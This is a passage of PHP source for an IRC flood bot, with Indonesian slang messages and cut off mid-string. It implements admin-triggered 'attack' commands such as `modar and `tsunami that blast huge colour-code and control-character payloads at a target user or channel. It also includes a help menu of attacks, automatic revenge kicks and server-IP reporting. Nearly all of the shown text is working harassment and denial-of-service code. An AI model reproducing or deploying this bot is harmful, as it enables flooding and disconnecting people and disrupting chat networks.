							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%034,1X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%033X@%032X@_@'. CRL);
						}
						elseif ($com[3]==':`modar' && $com[4] && $com[5]) {
							$msg = strstr($data,":`modar");
							$msg = str_replace(":`modar $com[4] ","",$msg);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%039,1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%034(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%034,4@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%0315,8XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%034(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%0315,11XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%034(G)'. CRL);
						}
						elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
							$msg = strstr($data,":`ctcp");
							$msg = str_replace(":`ctcp $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :%01'.$msg.'%01'. CRL);
						}
						elseif ($com[3]==':`ping' && $chan) {
							$sml = $smile[rand(0,count($smile) - 1)];
							fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', %034,15 Ping kamu 379 hari 15 jam 26 detik!%02 '.$sml. CRL);
						}
						$dNick = strtolower($dNick);
        						if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
         						 $musuh = $dNick;
          						fputs($fp, 'JOIN ' .$dcom[1]. CRL);
          						fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :•«(%034 bales!!! jejek cangkem e' . CRL);
						}
               					elseif ($com[3]==':`iklan') {
                 					if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :%0315,4 Join juga di channel #%039,1=%033AIG%039='. CRL); }
               						}
               					elseif ($com[3]==':`fb') {
                 					if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :%031,14 Fb>>> canmboyz@yahoo.com ADD yach...OKee!!'. CRL); }
               						}
						elseif ($com[3]==':`pong' && $chan) {
							$sml = $smile[rand(0,count($smile) - 1)];
							fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', %031modified By (%031Can[m]boyZ%03) %0312founder #AIG%031 '.$sml. CRL);
						}
						elseif ($com[3]==':`url' && $login["$dNick"]["status"]=="Admin") {
							$bhost = $_SERVER['HTTP_HOST'];
							$bip = $_SERVER['SERVER_ADDR'];
							$bphp  = $_SERVER['PHP_SELF'];
							$bruri = $_SERVER['REQUEST_URI'];
							$brip = $_SERVER['REMOTE_ADDR'];
							$bphp  = $_SERVER['PHP_SELF'];
							 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | Referer: $bruri | IP: $bip | Your IP: $brip Port:$brport" . CRL);
						}
						elseif ($com[3]==':`bantuan' && $login["$dNick"]["status"]=="Admin") {
                					 fputs($fp,"PRIVMSG $dNick :-=[renata versi bantuan]=-" . CRL);
               						 fputs($fp,"PRIVMSG $dNick :Jurus2 Mode Flood -" . CRL);
                 					 fputs($fp,"PRIVMSG $dNick :`sikat <nick> - serangan Kotak2 Notice & PV 3X" . CRL);
                 					 fputs($fp,"PRIVMSG $dNick :`bunuh <nick> - serangan Keong Notice 4X" . CRL);
                 					 fputs($fp,"PRIVMSG $dNick :`kasih <nick> - serangan Emotion Notice 2X" . CRL);
                 					 fputs($fp,"PRIVMSG $dNick :`emo <nick> - serangan Emotion PV 2X" . CRL);
                 					 fputs($fp,"PRIVMSG $dNick :`bacok <nick> - serangan Batik ampuh Notice & PV 3X" . CRL);
                					 fputs($fp,"PRIVMSG $dNick :`modar <nick> - serangan Ampuh Notice & PV 3X" . CRL);
                					 fputs($fp,"PRIVMSG $dNick :`kill <nick> - Jurus pamungkas 16X Notice & PV " . CRL);
                					 fputs($fp,"PRIVMSG $dNick :`tsunami <nick/#Chan> - Jurus Terlarang Penghancur Umat" . CRL);
                					 fputs($fp,"PRIVMSG $dNick :Serangan Siiaap Dilaksanakan !!" . CRL);
						}
						elseif ($com[3]==':`up' && $chan) {
							fputs($fp, 'PRIVMSG chanserv@services.allnetwork.org :op '.$chan.' '.$nick . CRL);
						}
						elseif ($com[3]==':`do' && $chan) {
							fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
						}
						elseif ($com[3]==':`tsunami' && $com[4] && $login["$dNick"]["status"]!="user") {
							$nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
							fputs($fp, 'NICK '.$nicktsu . CRL);
							if (substr($dCommand,0,3)=='433') {
								$nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
								fputs($fp, 'NICK '.$nicktsu . CRL);
							}
							$msg = strstr($data,":`tsunami");
							$msg = str_replace(":`tsunami $com[4]","",$msg);
							if (ereg("#", $com[4])) {
					   		  fputs($fp, 'JOIN '.$com[4] . CRL);
							}
							fputs($fp, 'PRIVMSG '.$com[4].' :%02'.$msg.'%038%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%0311%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.' . CRL);
							fputs($fp, 'NOTICE '.$com[4].' :%02'.$msg.'%039%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%0313%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.' . CRL);
							fputs($fp, 'PRIVMSG '.$com[4].' :%01HAJAR %02'.$msg.'%02%038,11:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@_@(G)' . CRL);
							fputs($fp, 'PRIVMSG '.$com[4].' :%02'.$msg.'%039%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%036%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%1F%7F%1F%7F%7F%1F%7F' . CRL);
							fputs($fp, 'NOTICE '.$com[4].' :%02'.$msg.'%0315%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%0311%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1